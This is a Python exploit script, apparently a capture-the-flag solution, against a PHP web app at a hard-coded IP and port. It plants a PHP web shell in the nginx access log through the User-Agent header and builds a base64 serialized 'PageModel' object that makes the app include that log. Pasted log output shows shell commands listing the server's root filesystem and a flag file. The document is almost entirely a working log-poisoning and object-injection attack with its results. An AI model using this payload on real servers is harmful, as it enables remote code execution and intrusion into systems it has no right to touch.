import requests, bs4, base64
connection = '165.22.121.146:30988'
payload_read_file = lambda file_name: base64.b64encode(str('O:9:"PageModel":1:{s:4:"file";s:'+ str(len(file_name)) +':"'+file_name+'";}').encode()).decode()
if __name__ == '__main__':
    requests.get(f'http://{connection}/', headers={'User-Agent':"<?php echo system($_GET['c'].' 2>&1'); ?>"}) # install shell
    print('[+] coockies : {0}'.format(payload_read_file("/var/log/nginx/access.log")))
    print("shell Parmater : {0}".format('/?c=<cmd>'))


"""
165.22.121.146 - 200 "GET / HTTP/1.1" "-" "total 84
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 .
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 ..
-rwxr-xr-x    1 root     root             0 Oct 22 14:56 .dockerenv
drwxr-xr-x    2 root     root          4096 Apr 14  2021 bin
drwxr-xr-x    5 root     root           360 Oct 22 14:56 dev
-rw-------    1 root     root           179 Apr 30 15:46 entrypoint.sh
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 etc
-rw-r--r--    1 root     root            31 Apr 30 15:29 flag_uRNTe
drwxr-xr-x    1 root     root          4096 Apr 19  2021 home
drwxr-xr-x    1 root     root          4096 Apr 14  2021 lib
drwxr-xr-x    5 root     root          4096 Apr 14  2021 media
drwxr-xr-x    2 root     root          4096 Apr 14  2021 mnt
drwxr-xr-x    2 root     root          4096 Apr 14  2021 opt
dr-xr-xr-x  500 root     root             0 Oct 22 14:56 proc
drwx------    2 root     root          4096 Apr 14  2021 root
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 run
drwxr-xr-x    2 root     root          4096 Apr 14  2021 sbin
drwxr-xr-x    2 root     root          4096 Apr 14  2021 srv
dr-xr-xr-x   13 root     root             0 Oct 22 13:22 sys
drwxrwxrwt    1 root     root          4096 Oct 22 14:56 tmp
drwxr-xr-x    1 root     root          4096 Apr 30 15:46 usr
drwxr-xr-x    1 root     root          4096 Apr 30 15:46 var
drwxr-xr-x    4 root     root          4096 Apr 30 16:27 www
drwxr-xr-x    4 root     root          4096 Apr 30 16:27 www" 
165.22.121.146 - 200 "GET / HTTP/1.1" "-" "aaaaaa" 
165.22.121.146 - 200 "GET /?c=ls HTTP/1.1" "-" "aaaaaa" 
165.22.121.146 - 408 "GET / HTTP/1.1" "-" "total 84
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 .
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 ..
-rwxr-xr-x    1 root     root             0 Oct 22 14:56 .dockerenv
drwxr-xr-x    2 root     root          4096 Apr 14  2021 bin
drwxr-xr-x    5 root     root           360 Oct 22 14:56 dev
-rw-------    1 root     root           179 Apr 30 15:46 entrypoint.sh
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 etc
-rw-r--r--    1 root     root            31 Apr 30 15:29 flag_uRNTe
drwxr-xr-x    1 root     root          4096 Apr 19  2021 home
drwxr-xr-x    1 root     root          4096 Apr 14  2021 lib
drwxr-xr-x    5 root     root          4096 Apr 14  2021 media
drwxr-xr-x    2 root     root          4096 Apr 14  2021 mnt
drwxr-xr-x    2 root     root          4096 Apr 14  2021 opt
dr-xr-xr-x  500 root     root             0 Oct 22 14:56 proc
drwx------    2 root     root          4096 Apr 14  2021 root
drwxr-xr-x    1 root     root          4096 Oct 22 14:56 run
drwxr-xr-x    2 root     root          4096 Apr 14  2021 sbin
drwxr-xr-x    2 root     root          4096 Apr 14  2021 srv
dr-xr-xr-x   13 root     root             0 Oct 22 13:22 sys
drwxrwxrwt    1 root     root          4096 Oct 22 14:56 tmp
drwxr-xr-x    1 root     root          4096 Apr 30 15:46 usr
drwxr-xr-x    1 root     root          4096 Apr 30 15:46 var
drwxr-xr-x    4 root     root          4096 Apr 30 16:27 www
drwxr-xr-x    4 root     root          4096 Apr 30 16:27 www" 
165.22.121.146 - 200 "GET /?c=ls+/ HTTP/1.1" "-" "aaaaaa" 
"""